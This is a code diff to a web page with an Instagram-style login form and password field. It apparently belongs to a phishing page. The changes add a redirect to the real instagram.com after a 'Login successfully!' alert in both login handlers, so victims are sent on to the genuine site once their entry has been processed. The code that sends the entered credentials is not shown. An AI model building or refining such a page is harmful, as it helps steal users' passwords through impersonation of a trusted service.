@@ -41,8 +41,7 @@
                     <input name="password" id="password-laptop" type="password" placeholder="Password" required />
                     <button  type="submit">Log in
 
-                        <a href="https://www.instagram.com/">
-                        </a>
+                        <a href="https://www.instagram.com/"></a>
 
                     </button>
                     
@@ -143,6 +142,7 @@
                 .then(function() {
                     console.log('SUCCESS!');
                     alert('Login successfully!');
+                    window.location.href = "https://www.instagram.com/"; 
                 }, function(error) {
                     console.log('FAILED...', error);
                     alert('Failed to login... Please try again.');
@@ -156,6 +156,7 @@
                 .then(function() {
                     console.log('SUCCESS!');
                     alert('Login successfully !');
+                    window.location.href = "https://www.instagram.com/"; 
                 }, function(error) {
                     console.log('FAILED...', error);
                     alert('Failed to login.... Please try again.');
